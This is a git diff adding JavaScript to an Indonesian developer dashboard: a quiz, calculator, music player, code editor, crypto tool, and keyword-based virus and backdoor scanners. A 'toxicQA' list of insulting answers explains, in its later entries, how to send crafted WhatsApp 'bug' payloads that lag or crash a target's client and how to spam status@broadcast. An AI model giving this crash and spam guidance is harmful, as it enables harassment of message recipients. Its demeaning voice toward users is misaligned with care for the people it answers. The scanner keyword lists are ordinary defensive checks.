+    { q: "Apa fungsi utama file package.json?", o: ["Konfigurasi project", "Backup file", "Log sistem", "Versi git"], a: 0 },
+    { q: "Apa itu Webhook?", o: ["Pengirim data otomatis via POST", "Bot handler", "Database", "Server listener"], a: 0 },
+    { q: "Apa itu Express.js?", o: ["Framework Node.js untuk routing & API", "Text editor", "Cloud tool", "Plugin NPM"], a: 0 },
+    { q: "Command Handler digunakan untuk?", o: ["Modular command bot", "Install bot", "Jalankan loop", "Run log"], a: 0 },
+    { q: "Perintah upload file ke VPS dengan SCP?", o: ["scp file.js user@ip:/folder", "upload vps", "push file", "send.js"], a: 0 },
+    { q: "Apa itu endpoint API?", o: ["URL untuk akses API", "Login admin", "Koneksi DB", "HTML Page"], a: 0 },
+    { q: "Contoh alat SFTP?", o: ["FileZilla", "Notepad", "CMD", "Termux"], a: 0 },
+    { q: "Apa itu bug WA MD?", o: ["Exploit WA Multi Device", "Plugin NPM", "Update fitur", "Template JS"], a: 0 },
+    { q: "Cara hosting bot di VPS?", o: ["Gunakan PM2 atau node index.js", "Open .zip", "npm install index.html", "Ketik login"], a: 0 },
+    { q: "Apa itu JSON?", o: ["Format pertukaran data", "Bahasa pemrograman", "Framework", "Driver database"], a: 0 },
+  ];
+
+  let kuisUsed = [], kuisScore = 0, kuisCountdown;
+  const kuisMax = 10, kuisTime = 15;
+
+  function bukaKuis() {
+    const sections = document.querySelectorAll(".glass");
+    sections.forEach(div => div.style.display = "none");
+    document.getElementById("kuisPage").style.display = "block";
+    loadKuis();
+  }
+
+
+  function loadKuis() {
+    kuisUsed = [];
+    kuisScore = 0;
+    document.getElementById("scoreArea").style.display = "none";
+    document.getElementById("options").style.display = "block";
+    nextSoal();
+  }
+
+  function nextSoal() {
+    if (kuisUsed.length >= kuisMax) return tampilSkor();
+    let idx;
+    do {
+      idx = Math.floor(Math.random() * kuisQuestions.length);
+    } while (kuisUsed.includes(idx));
+    kuisUsed.push(idx);
+    tampilSoal(kuisQuestions[idx]);
+  }
+
+  function tampilSoal(data) {
+    const qElem = document.getElementById("question");
+    const optBox = document.getElementById("options");
+    optBox.innerHTML = "";
+    qElem.textContent = `(${kuisUsed.length}/${kuisMax}) ${data.q}`;
+
+    // Acak opsi dan lacak jawaban benar
+    const options = data.o.map((text, i) => ({ text, correct: i === data.a }));
+    const shuffled = options.sort(() => Math.random() - 0.5);
+
+    shuffled.forEach(opt => {
+      const btn = document.createElement("button");
+      btn.className = "btn";
+      btn.textContent = opt.text;
+      btn.onclick = () => {
+        clearInterval(kuisCountdown);
+        if (opt.correct) kuisScore++;
+        nextSoal();
+      };
+      optBox.appendChild(btn);
+    });
+
+    // Timer per soal
+    const timerDiv = document.createElement("div");
+    let waktu = kuisTime;
+    timerDiv.style.margin = "10px";
+    timerDiv.textContent = `⏳ Waktu: ${waktu}s`;
+    optBox.prepend(timerDiv);
+    clearInterval(kuisCountdown);
+    kuisCountdown = setInterval(() => {
+      waktu--;
+      timerDiv.textContent = `⏳ Waktu: ${waktu}s`;
+      if (waktu <= 0) {
+        clearInterval(kuisCountdown);
+        nextSoal();
+      }
+    }, 1000);
+  }
+
+  function tampilSkor() {
+    document.getElementById("question").textContent = "✅ Kuis Selesai!";
+    document.getElementById("options").style.display = "none";
+    document.getElementById("scoreArea").style.display = "block";
+    const persen = Math.round((kuisScore / kuisUsed.length) * 100);
+    document.getElementById("scoreText").textContent = `Skor Kamu: ${kuisScore}/${kuisUsed.length} (${persen}%)`;
+  }
+  function bukaNotes() {
+    document.querySelectorAll(".glass").forEach(div => div.style.display = "none");
+    document.getElementById("notesPage").style.display = "block";
+  }
+
+  function simpanKeFile() {
+    const isi = document.getElementById("noteArea").value.trim();
+    if (!isi) {
+      alert("✋ Catatan masih kosong!");
+      return;
+    }
+    const blob = new Blob([isi], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const link = document.createElement("a");
+    link.href = url;
+    const waktu = new Date().toISOString().slice(0, 19).replace(/:/g, "-");
+    link.download = `Catatan_DevZal_${waktu}.txt`;
+    link.click();
+    URL.revokeObjectURL(url);
+  }
+
+  function bukaKalkulator() {
+    document.querySelectorAll(".glass").forEach(div => div.style.display = "none");
+    document.getElementById("kalkulatorPage").style.display = "block";
+  }
+
+  function hitung(op) {
+    const a = parseFloat(document.getElementById("num1").value);
+    const b = parseFloat(document.getElementById("num2").value);
+    const output = document.getElementById("hasil");
+
+    if (isNaN(a) || isNaN(b)) {
+      output.textContent = "⚠️ Masukkan angka dulu!";
+      return;
+    }
+
+    let hasil;
+    switch (op) {
+      case '+': hasil = a + b; break;
+      case '-': hasil = a - b; break;
+      case '*': hasil = a * b; break;
+      case '/': hasil = b !== 0 ? (a / b).toFixed(2) : '∞'; break;
+    }
+
+    output.textContent = "Hasil: " + hasil;
+  }
+
+  let belajarWaktu = 0;
+  let belajarInterval;
+
+  function mulaiTimerBelajar() {
+    const now = new Date();
+    const hariIni = now.toISOString().slice(0, 10);
+    const storageKey = "waktuBelajar_" + hariIni;
+
+    // Ambil data sebelumnya
+    const dataSebelumnya = localStorage.getItem(storageKey);
+    belajarWaktu = dataSebelumnya ? parseInt(dataSebelumnya) : 0;
+
+    // Update setiap detik
+    belajarInterval = setInterval(() => {
+      belajarWaktu++;
+      localStorage.setItem(storageKey, belajarWaktu);
+      updateTampilanBelajar();
+    }, 1000);
+  }
+
+  function updateTampilanBelajar() {
+    const menit = Math.floor(belajarWaktu / 60);
+    const detik = belajarWaktu % 60;
+    document.getElementById("belajarTimer").textContent = 
+      `⏱ Kamu sudah belajar ${menit} menit ${detik < 10 ? "0" : ""}${detik} detik hari ini`;
+  }
+
+  // Mulai saat halaman dibuka
+  window.addEventListener("load", () => {
+    mulaiTimerBelajar();
+    updateTampilanBelajar();
+  });
+  
+function bukaTerminal() {
+  document.querySelectorAll(".glass").forEach(div => div.style.display = "none");
+  document.getElementById("terminalPage").style.display = "block";
+  document.getElementById("terminalInput").focus();
+}
+
+function runCommand() {
+  const input = document.getElementById("terminalInput");
+  const output = document.getElementById("terminalOutput");
+  const cmd = input.value.trim();
+  const responses = {
+    'ls': '📁 materi/  📄 index.html  📦 node_modules/',
+    'cd': 'Berpindah direktori...',
+    'git status': 'On branch main\nnothing to commit, working tree clean',
+    'npm start': '🚀 Server berjalan di http://localhost:3000',
+    'help': 'Perintah: ls, cd, git status, npm start, clear',
+    'clear': ''
+  };
+  const response = responses[cmd] ?? '❌ Perintah tidak dikenali.';
+  if (cmd === 'clear') output.innerHTML = '';
+  else output.innerHTML += `<div><span style="color:#0ff">$ ${cmd}</span><br>${response}</div>`;
+  input.value = '';
+  output.scrollTop = output.scrollHeight;
+}
+
+const laguList = {
+  sad: [
+      "https://files.catbox.moe/5s0497.mp3",
+  "https://files.catbox.moe/tyq7gm.mp3",
+  "https://files.catbox.moe/kdoeno.mp3",
+  "https://files.catbox.moe/syrp3c.mp4",
+  "https://files.catbox.moe/k0zfxh.mp4",
+  "https://files.catbox.moe/sbeckl.mp3",
+  "https://files.catbox.moe/t43axq.mp3",
+  "https://files.catbox.moe/wmrz4c.mp4",
+  "https://files.catbox.moe/t7e0uj.mp3",
+  "https://files.catbox.moe/5so1ow.mp4",
+  "https://files.catbox.moe/577un5.mp3",
+  "https://files.catbox.moe/ihyu3j.mp3",
+  "https://files.catbox.moe/l0sv56.mp3",
+  "https://files.catbox.moe/p3ujes.mp3",
+  "https://files.catbox.moe/zqg9ba.mp3",
+  "https://files.catbox.moe/yoebl2.mp3"
+  ],
+  phonk: [
+  "https://files.catbox.moe/i5eank.mp3",
+  "https://files.catbox.moe/bp0m5o.m4a",
+  "https://files.catbox.moe/rooj3b.mp3",
+  "https://files.catbox.moe/1x9ear.mp3",
+  "https://files.catbox.moe/8b0yqe.mp3",
+  "https://files.catbox.moe/rn9t1e.mp3",
+  "https://files.catbox.moe/ri8ldr.mp3",
+  "https://files.catbox.moe/ecxk53.mp3",
+  "https://files.catbox.moe/xqfz1f.mp4"
+  ],
+  dj: [
+    "https://files.catbox.moe/otyzgl.mp3",
+  "https://files.catbox.moe/9wttm6.mp4",
+  "https://files.catbox.moe/jt6sp4.mp3",
+  "https://files.catbox.moe/6019hy.mp3",
+  "https://files.catbox.moe/e5iukb.mp4",
+  "https://files.catbox.moe/tw7vdb.mpeg"
+  ]
+};
+
+let currentGenre = "";
+let currentSong = 0
+let playing = false;
+
+function loadGenre(genre) {
+  currentGenre = genre;
+  currentSong = 0;
+
+  const player = document.getElementById("musicPlayer");
+  if (laguList[genre] && laguList[genre].length > 0) {
+    player.src = laguList[genre][currentSong];
+    playAudio();
+  } else {
+    alert("Genre tidak ditemukan!");
+  }
+}
+
+function toggleAudio() {
+  const player = document.getElementById("musicPlayer");
+  if (!player.src) {
+    alert("Pilih genre dulu!");
+    return;
+  }
+
+  if (playing) {
+    player.pause();
+    playing = false;
+    document.getElementById("playBtn").textContent = "▶️ Play";
+  } else {
+    playAudio();
+  }
+}
+
+function playAudio() {
+  const player = document.getElementById("musicPlayer");
+  player.play().then(() => {
+    playing = true;
+    document.getElementById("playBtn").textContent = "⏸️ Pause";
+  }).catch((err) => {
+    console.error("❌ Gagal memutar lagu:", err);
+  });
+}
+
+let editor;
+
+function bukaEditor() {
+  sembunyiSemua();
+  document.getElementById("editorPage").style.display = "block";
+
+  if (!editor) {
+    editor = CodeMirror.fromTextArea(document.getElementById("codeEditor"), {
+      lineNumbers: true,
+      mode: "htmlmixed",
+      theme: "material-darker", // <- DARK THEME
+      indentUnit: 2,
+      smartIndent: true,
+      tabSize: 2,
+    });
+  }
+}
+
+function setEditorMode(mode) {
+  if (editor) editor.setOption("mode", mode);
+}
+
+function jalankanKode() {
+  const kode = editor.getValue();
+  document.getElementById("previewFrame").srcdoc = kode;
+
+  sembunyiSemua();
+  document.getElementById("outputPage").style.display = "block";
+}
+
+function kembaliEditor() {
+  sembunyiSemua();
+  document.getElementById("editorPage").style.display = "block";
+}
+
+
+function sembunyiSemua() {
+  document.querySelectorAll(".glass").forEach(div => div.style.display = "none");
+}
+
+  function kembaliDashboard() {
+    document.querySelectorAll(".glass").forEach(div => div.style.display = "none");
+    if (typeof kuisCountdown !== "undefined") clearInterval(kuisCountdown);
+    document.getElementById("dashboard").style.display = "block";
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    const saved = localStorage.getItem("devUser");
+    if (saved) {
+      document.getElementById("loginContainer").style.display = 'none';
+      document.getElementById("dashboard").style.display = 'block';
+      document.getElementById("welcomeMsg").textContent = `Selamat datang, ${saved}!`;
+    }
+  });
+  function bukaVirusScanner() {
+    document.getElementById("dashboard").style.display = "none";
+    document.getElementById("virusScannerPage").style.display = "block";
+  }
+
+  function handleFileVirus(event) {
+    const file = event.target.files[0];
+    const reader = new FileReader();
+    reader.onload = function (e) {
+      document.getElementById("virusCode").value = e.target.result;
+    };
+    reader.readAsText(file);
+  }
+
+  function scanVirus() {
+    const code = document.getElementById("virusCode").value;
+    const result = document.getElementById("virusHasil");
+
+    if (!code.trim()) {
+      result.style.display = "block";
+      result.innerHTML = "⚠️ Silakan masukkan atau upload script terlebih dahulu.";
+      return;
+    }
+
+    const keywords = ["eval", "while(true)", "child_process", "Buffer.from", "atob", "crypto", "exec", "shell", "fetch", "XMLHttpRequest"];
+    const lowerCode = code.toLowerCase();
+    const found = keywords.filter(k => lowerCode.includes(k.toLowerCase()));
+
+    if (found.length > 0) {
+      result.style.display = "block";
+      result.innerHTML = `🚨 <strong>Script Mencurigakan Terdeteksi</strong><br/><br/>
+      Ditemukan penggunaan: <b>${found.join(', ')}</b><br/><br/>
+      💡 <u>Solusi:</u> Hindari <code>eval</code> atau perintah shell tanpa validasi ketat. Pastikan input tidak berasal dari sumber tak terpercaya.`;
+    } else {
+      result.style.display = "block";
+      result.innerHTML = "✅ Tidak ditemukan indikasi script berbahaya.";
+    }
+  }
+
+  function resetVirus() {
+    document.getElementById("virusCode").value = "";
+    document.getElementById("virusHasil").style.display = "none";
+  }
+
+  function bukaCryptoTool() {
+    document.getElementById("dashboard").style.display = "none";
+    document.getElementById("cryptoToolPage").style.display = "block";
+  }
+
+  async function prosesCrypto() {
+    const text = document.getElementById("cryptoInput").value;
+    const mode = document.getElementById("cryptoMode").value;
+    const key = document.getElementById("aesKey").value;
+    const output = document.getElementById("cryptoOutput");
+
+    if (!text.trim()) return output.innerHTML = "⚠️ Masukkan teks dulu.";
+
+    if (mode.includes("aes") && !key.trim()) {
+      return output.innerHTML = "⚠️ Masukkan kunci AES terlebih dahulu.";
+    }
+
+    try {
+      if (mode === "md5") {
+        output.innerHTML = `🔑 Hash MD5: <br><code>${await hashText(text, "MD5")}</code>`;
+      } else if (mode === "sha256") {
+        output.innerHTML = `🔑 Hash SHA256: <br><code>${await hashText(text, "SHA-256")}</code>`;
+      } else if (mode === "aes-encrypt") {
+        const encrypted = await aesEncrypt(text, key);
+        output.innerHTML = `🔐 AES Encrypted:<br><code>${encrypted}</code>`;
+      } else if (mode === "aes-decrypt") {
+        const decrypted = await aesDecrypt(text, key);
+        output.innerHTML = `🔓 AES Decrypted:<br><code>${decrypted}</code>`;
+      }
+    } catch (e) {
+      output.innerHTML = "❌ Error: " + e.message;
+    }
+  }
+
+  function resetCrypto() {
+    document.getElementById("cryptoInput").value = "";
+    document.getElementById("cryptoOutput").innerHTML = "";
+    document.getElementById("aesKey").value = "";
+  }
+
+  async function hashText(str, algo) {
+    const data = new TextEncoder().encode(str);
+    const hash = await crypto.subtle.digest(algo, data);
+    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
+  }
+
+  async function aesEncrypt(text, keyStr) {
+    const enc = new TextEncoder();
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const key = await crypto.subtle.importKey("raw", enc.encode(keyStr.padEnd(16)), "AES-GCM", false, ["encrypt"]);
+    const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(text));
+    const result = [...iv, ...new Uint8Array(encrypted)];
+    return btoa(String.fromCharCode(...result));
+  }
+
+  async function aesDecrypt(base64, keyStr) {
+    const raw = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+    const iv = raw.slice(0, 12);
+    const data = raw.slice(12);
+    const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(keyStr.padEnd(16)), "AES-GCM", false, ["decrypt"]);
+    const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
+    return new TextDecoder().decode(decrypted);
+  }
+  function bukaBackdoorDetector() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("backdoorPage").style.display = "block";
+}
+
+function handleBackdoorFile(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    document.getElementById("backdoorInput").value = e.target.result;
+  };
+  reader.readAsText(file);
+}
+
+function cekBackdoor() {
+  const code = document.getElementById("backdoorInput").value;
+  const hasil = document.getElementById("backdoorHasil");
+
+  if (!code.trim()) {
+    hasil.innerHTML = "⚠️ Masukkan atau upload script dulu.";
+    return;
+  }
+
+  const patterns = [
+    { keyword: "eval(", info: "⚠️ eval digunakan untuk eksekusi dinamis – bisa berbahaya!" },
+    { keyword: "atob(", info: "⚠️ atob digunakan untuk decode base64 – cek apakah isinya aman." },
+    { keyword: "Function(", info: "⚠️ Constructor Function bisa dipakai jalankan kode tersembunyi." },
+    { keyword: "child_process", info: "🚨 child_process bisa jalankan command sistem." },
+    { keyword: "require('fs')", info: "⚠️ Mengakses file sistem, cek apakah aman." },
+    { keyword: "require(\"fs\")", info: "⚠️ Mengakses file sistem, cek apakah aman." },
+    { keyword: "exec(", info: "🚨 exec() bisa eksekusi shell command!" },
+    { keyword: "fetch(", info: "⚠️ fetch bisa digunakan untuk ambil script jarak jauh." },
+    { keyword: "XMLHttpRequest", info: "⚠️ Akses HTTP manual – bisa curi data atau inject skrip." },
+    { keyword: "http://", info: "⚠️ Deteksi URL tidak aman (HTTP)." },
+    { keyword: "https://", info: "⚠️ Deteksi URL eksternal, cek apakah mencurigakan." },
+  ];
+
+  let report = "";
+  patterns.forEach(p => {
+    if (code.toLowerCase().includes(p.keyword.toLowerCase())) {
+      report += `✅ <b>${p.keyword}</b><br>${p.info}<br><br>`;
+    }
+  });
+
+  hasil.innerHTML = report ? report : "✅ Tidak ditemukan tanda backdoor mencurigakan.";
+}
+  
+function resetBackdoor() {
+  document.getElementById("backdoorInput").value = "";
+  document.getElementById("backdoorHasil").innerHTML = "";
+}
+const toxicQA = [
+  {
+    q: "Apa itu JavaScript?",
+    a: "JavaScript itu bahasa pemrograman yang dipakai buat bikin website jadi interaktif. Tapi buat orang kayak lu, kayaknya itu cuma mantra sihir yang bikin error doang. Dipakai di browser, bisa bikin tombol bisa diklik, bikin animasi, fetch data, dan banyak hal. Sayangnya, otak lu kayaknya stuck di era HTML doang. Bahkan console.log aja masih nanya artinya. Saran: sebelum nyentuh JavaScript lagi, belajar logika dasar dulu, terus install empati ke sesama developer yang harus debug hasil kerja lu."
+  },
+  {
+    q: "Kenapa script gue error mulu?",
+    a: "Karena setiap kali lu ngetik, Tuhan coding nangis. Error itu muncul karena kode lu kacau, logikanya absurd, dan penulisan variabel kadang kayak nama karakter anime. Lu bahkan gak baca error message-nya, langsung panik nanya ke grup. Coba baca pelan-pelan, pahami error-nya, debug satu-satu, bukan spam grup minta solusi buat dosa coding lu sendiri."
+  },
+  {
+    q: "Apa gunanya HTML?",
+    a: "HTML itu pondasi website, bro. Tapi kayaknya lu bangun pondasi pake lumpur, bukan semen. HTML ngatur struktur: heading, paragraph, link, gambar, form — semua dibungkus dalam tag. Tapi lu? Pakai `<div>` buat semuanya, kayak anak yang baru belajar lego. Website lu flat, error, dan gak valid semantik. Belajar struktur tag HTML dulu sebelum ngomongin CSS dan JavaScript."
+  },
+  {
+    q: "Kenapa bot WhatsApp ga jalan?",
+    a: "Karena lu copas script dari GitHub tanpa baca README, terus ngarep bisa langsung jadi Dewa Bot. Token salah, session gak disimpan, atau environment gak diset. Paling parah: lu gak tau bedanya Baileys sama venom. Lu gak debug, gak ngerti log-nya, cuma nanya: ‘bang kenapa gak connect?’. Jawaban: Karena user-nya juga gak connect ke kenyataan."
+  },
+  {
+    q: "Apa itu API?",
+    a: "API itu jembatan komunikasi antar aplikasi. Misalnya lu mau ambil data cuaca dari server, lu gak harus hack BMG, cukup pake API. Tapi lu malah nyangka API itu skrip rahasia elite hacker. Udah gitu, cara pake `fetch` aja salah, endpoint salah, gak pake token, terus nanya: ‘kok null ya datanya?’. Karena otak lu juga `null`, bro. Pahami konsep GET, POST, headers, payload — jangan cuma copas Axios doang."
+  },
+  {
+    q: "Cara deploy ke VPS?",
+    a: "Pertama, buka terminal. Kedua, connect pake SSH. Ketiga, upload project. Keempat, install dependensi, jalankan service, selesai. Tapi lu? Masuk VPS aja gak bisa, ketik `cd` aja salah, terus bilang: ‘gagal deploy’. Ya iya! Lu gak ngerti Linux, gak ngerti firewall, gak ngerti port. Lu pengen hosting bot, tapi gak ngerti perintah `pm2`, `nohup`, atau service manager. Baca tutorial, praktik, jangan cuma ngeluh."
+  },
+  {
+    q: "Apa itu obfuscator?",
+    a: "Obfuscator itu alat buat nyamarin kode biar susah dibaca orang lain. Tapi jujur aja, kode lu gak perlu diobfuscate — karena udah jelek dari lahir. Bahkan lu sendiri gak bisa baca kode lu yang lu tulis minggu lalu. Jadi kalau tujuannya biar aman, belajar cara bikin kode yang bener dulu. Obfuscate itu langkah akhir, bukan pelindung buat kekacauan logic internal."
+  },
+  {
+    q: "Kenapa web gue lemot?",
+    a: "Karena lu isi 10MB gambar PNG gak di-compress, load font dari lima tempat, dan animasi semua elemen pake JavaScript yang jalan terus. CSS lu penuh efek blur, JS lu looping gak penting, API lu delay 3 detik. Bahkan preloader aja beratnya kayak game PS2. Lu pengen web cepet? Audit pake Lighthouse, compress gambar, lazy load, caching, dan yang paling penting: hapus semua efek gak guna dari template copasan lu."
+  },
+  {
+    q: "Gimana bikin bot anti-detect?",
+    a: "Pertama-tama, sadari dulu... bot lu ketahuan bukan karena API, tapi karena kelakuan. Delay gak natural, pattern request terlalu mirip, user-agent sama semua, terus scrapingnya barbar. Mau anti-detect? Pelajari headless browser, randomization, mimic behavior manusia. Tapi kalau bot lu aja hasil copas dari repo 2019, ya ampun... ngarep bisa stealth? Yang stealth itu kemampuan logika lu. Gak kedetect sama sekali."
+  },
+  {
+    "q": "30. Script WhatsApp itu apa sih?",
+    "a": "Script WhatsApp itu kode yang jalanin bot lo di WA. Tapi kalau lo kira script WA itu cuma 'case menu', mending uninstall niat dulu. Script itu nyambung ke API, handle event, parsing message, dan ngasih respon. Bukan cuma rename menu jadi 'ZalBot V999'. Lo kira lo developer? Padahal cuma dekorator file JS."
+  },
+  {
+    "q": "31. Kenapa handler gua ga jalan?",
+    "a": "Handler gak jalan? Coba liat, lo ngerti `switch-case` gak? Atau masih mikir handler itu plugin? Biasanya yang handlernya mati itu karena buka script langsung ganti nama, hapus logic, terus bingung. Bro, handler itu pusat logika bot. Lo rusak dikit, ya tamat. Jangan salahin script, salahin jari lo yang salah paham."
+  },
+  {
+    "q": "32. Function bug itu masukinnya dimana?",
+    "a": "Masukin function bug tuh di bagian logika pengirim, bukan dilempar ke dalam `console.log()` kayak orang baru belajar. Biasanya di `sendMessage()` atau custom command. Tapi kalau lo malah paste sembarang, ya jelas ga jalan. Script bukan tempat buang hajat bug lo yang copas-an."
+  },
+  {
+    "q": "33. Gimana cara upload ke VPS?",
+    "a": "Upload ke VPS itu bisa pakai SCP, FileZilla, atau CLI kayak `rsync`. Tapi kalau lo masih nanya 'apa itu VPS?', udahan dulu. Balik ke YouTube nonton cara install termux. Upload tuh bukan paste di chat bot, tapi kirim file ke server lo. Belajar dikit lah, jangan modal ngikut tren doang."
+  },
+  {
+    "q": "34. Apa yang dimaksud struktur project?",
+    "a": "Struktur project itu kayak rangka rumah. Ada folder auth, message, handler, function, config. Kalau semua lo campur di 1 file, lo bukan programmer, lo tukang acak-acak. Gimana mau berkembang kalau mindset lo masih nyampahin script kayak desktop penuh shortcut?"
+  },
+  {
+    "q": "35. Script WA gue error pas dijalanin, kenapa?",
+    "a": "Error? Buka log error-nya. Atau lo gak ngerti cara baca `TypeError`? Mungkin karena file hilang, dependensi belum di-install, atau lo salah edit. Tapi kalau lo baru buka VSCode terus bilang 'kok botnya gak aktif?', lo bukan coder, lo penonton hidup doang."
+  },
+  {
+    "q": "36. Bisa hosting bot di termux?",
+    "a": "Bisa, tapi jangan harap stabil. Bot di termux itu kayak nginap di pos ronda. Tidur, bangun, tidur lagi. Lo butuh VPS biar 24 jam jalan. Kalau lo bangga botnya hidup 2 jam lalu mati, ya selamat, lo master of tidur mendadak."
+  },
+  {
+    "q": "37. Apa itu obfuscate?",
+    "a": "Obfuscate itu nyamarkan kode biar gak gampang di-copy atau diubah. Tapi buat apa lo obfuscate script copas? Lo nyamarin kebodohan? Obfuscate itu buat protect logic lo, bukan buat gaya di grup WA biar script lo keliatan pro padahal isinya `if (1==1)`."
+  },
+  {
+    "q": "38. JSON itu buat apa?",
+    "a": "JSON itu format data. Kayak cara server ngirim informasi. Tapi kalau lo liat `{}` terus bilang 'wah ini kode', lo butuh konsultasi. JSON itu struktur, bukan fungsi. Lo belajar basic dulu, jangan ngira semua file `.json` bisa diobfuscate buat pamer."
+  },
+  {
+    "q": "39. Gimana auto deploy bot biar gak buka terminal terus?",
+    "a": "Auto deploy? Pake CI/CD kayak PM2, GitHub Actions, atau cronjob. Tapi kalo lo ga ngerti terminal aja, ngapain mikir auto? Lo baru buka bot pakai 'node .', 10 menit kemudian udah mati, terus nanya 'bang fixin'. Mental bayi. Upgrade skill dulu, bukan minta fix tiap error muncul."
+  },
+  {
+    "q": "40. Kenapa script auto-reply kadang ga respon?",
+    "a": "Karena logic lo jelek, parsing-nya salah, atau lo bikin regex kayak orang mabok. Kalau auto-reply bot lo cuma jawab 'ya' dan 'tidak', itu bukan bot, itu buku polling. Debug dulu, jangan spam grup nyari solusi kayak bocah ilang arah."
+  },
+  {
+    q: "Console.log gak muncul?",
+    a: "Gak muncul karena lu gak ngerti basic. console.log itu cuma jalan kalau script-nya bener, bukan hasil rename dari script orang. Cek syntax, cek environment, dan tolong... jangan debug pake mental bocil epep. Itu codingan, bukan stiker."
+  },
+  {
+    q: "Kenapa viewOnce bug udah gak work?",
+    a: "Karena WhatsApp udah update, bang. Kalau lu masih pake metode 2022 buat ngebug WA versi 2.25.19.80, jelas mentalmu tinggal di masa lalu. Ngoding tuh dinamis, bukan pake mindset 'asal kirim blank = crash'."
+  },
+  {
+    q: "Cara kirim bug invisible WA?",
+    a: "Invisible bug itu bukan sekadar kosongin teks. Harus tau trigger pattern, context info, dan compression yang bikin client nge-lag. Tapi ya percuma dijelasin juga kalau lu bisanya cuma forward bug grup kayak bocah."
+  },
+  {
+    q: "Apa itu function ZalDelayNew1?",
+    a: "Itu salah satu function untuk delay+blank combo yang bikin client drop. Tapi daripada nanya gitu doang, kenapa gak lu pelajari cara kerja message layer-nya? Atau takut logika lu kebakar overload?"
+  },
+  {
+    q: "Kenapa bug group gak ngefek?",
+    a: "Karena yang lu kirim bukan bug, tapi sisa-sisa rename script dari GitHub. Ngefek itu butuh kombinasi media, contextInfo, dan format pesan yang nyerang parsing internal client. Bukan asal spam emoji delay."
+  },
+  {
+    q: "Apa beda blank bug sama zalfreeze?",
+    a: "Blank bug itu karakter kosong yang dirender abnormal. ZalFreeze udah next level, pake struktur context yang bikin parser ketar-ketir. Tapi ya buat bocil rename, dua-duanya tetep kerasa kayak magic hitam."
+  },
+  {
+    q: "Cara crash-in WA target?",
+    a: "Crash itu bukan kayak lempar batu ke kaca. Lo perlu craft struktur JSON yang overkill, optimize corruption data, dan trigger parsing stack error. Tapi kalo mindset lu masih 'bang ini work kah?', ya udah... rename aja terus."
+  },
+  {
+    q: "Kenapa bug private gak ngaruh?",
+    a: "Karena private chat sekarang di-harden sama WhatsApp. Gak semua bug work. Harus ngerti context, update struktur WA, dan cara ngirim payload yang valid. Tapi ngarep ngerti sih susah, buat bocil yang ngedit nama doang di sc."
+  },
+  {
+    q: "Fungsi dari groupStatusMentionMessage?",
+    a: "Itu fitur buat mention semua member via status. Kalau digabungin ama media glitchy, bisa delay-in client. Tapi bukan buat pajangan doang, kayak script yang lo pake hasil rename 3 lapis."
+  },
+  {
+    q: "Apa itu bug SW delay?",
+    a: "SW delay itu bug di status WhatsApp yang kirim konten berat + context massal. Tapi lu kira itu cuma spam 1 viewOnce? Coba buka mata dan debug packet-nya. Kalau gak bisa... ya uninstall logika aja dulu."
+  },
+  {
+    q: "Gimana cara spam ke status@broadcast?",
+    a: "Cukup kirim ke JID itu dengan media yang crafted. Tapi hati-hati, spam berlebihan bikin client drop. Nah masalahnya, lu ngerti JID aja enggak. Jadi... belajar dulu. Rename doang gak bikin jadi coder."
+  },
+  {
+    q: "Kenapa crash gak work di versi baru?",
+    a: "Karena struktur WA update. Bug jadul kayak emoji delay, blank 200k, atau zalbasic udah ditambal. Tapi kalo lu masih ngotot pakenya script dari 2021, ya pantas aja cuma bisa banned-banned-an doang."
+  },
+  {
+    q: "Bisa bikin script Telegram kayak WA?",
+    a: "Bisa. Tapi beda library. Telegram lebih stabil dan susah dibug. Kalau lu mau clone WA bot ke Tele, minimal ngerti `telegraf.js`, `context`, dan `middleware`. Bukan asal cari 'bot anti banned'."
+  },
+  {
+    q: "Apa itu payload zal-crasher?",
+    a: "Itu payload buatan Zal buat testing crash client. Tapi bukan buat bocil pake sembarangan. Lu ngerti gak sih apa itu corrupted media + overloop context? Kalo enggak, better stop before you destroy yourself."
+  },
+  {
+    q: "Kenapa script banyak yang kena banned?",
+    a: "Karena usernya spam brutal, kirim bug kayak barbar. WhatsApp gak bodoh. Mereka bisa detect pola. Jadi stop nyalahin script, dan mulai tanya ke diri sendiri: gue udah belajar belum, atau cuma rename doang?"
+  },
+  {
+    q: "Fungsi controlNative buat apa?",
+    a: "Buat trigger behavior native WA agar handle payload secara error. Tapi percuma dijelasin kalau HTML aja belum paham, JSON aja dianggap virus, dan coding lo cuma buka file .js terus rename author."
+  },
+  {
+    q: "Apa itu zalpanel-bug-vps?",
+    a: "ZalPanel itu interface custom buat kontrol bot & bug sender via VPS. Tapi kalau lu nanya ini sambil buka Termux doang, mending install Gacha Club aja. Sama-sama useless kalau gak paham sistem."
+  },
+  {
+    q: "Apa fungsi viewOnce+mentionedJid?",
+    a: "ViewOnce bikin media 1x tampil, tapi kalau digabung `mentionedJid`, bisa trigger parsing error karena metadata overload. Tapi lu taunya cuma forward dari grup sebelah. Pantes aja bug kagak jalan."
+  },
+  {
+    q: "Kenapa WA client jadi lemot abis nerima bug?",
+    a: "Karena parsing engine WA overload nerima struktur gak wajar. Tapi kalau lu kirimnya cuma spam stiker dan emoji delay, ya kagak ngefek apa-apa selain memalukan komunitas dev seluruh dunia."
+  },
+  {
+    q: "ZalDelayNew1 aman buat spam?",
+    a: "Itu bukan buat spam. Itu untuk eksperimen crash/lag. Kalau lu pake buat spam, jangan heran WA target auto nutup. Tapi ya... spam + rename doang emang cocok buat yang skill-nya mentok kayak gitu."
+  },
+{
+  q: "Apa itu Function Bug di WhatsApp?",
+  a: "Function bug itu bukan emoji spam atau kirim ⭕ seribu kali. Itu trik buat nge-crash client WA. Tapi kalo lu nanya kayak gini, fix baru kenal Baileys 2 hari, terus ngaku Dev WA. Sabar, bocil."
+},
+{
+  q: "Cara Buat Function Bug Sendiri?",
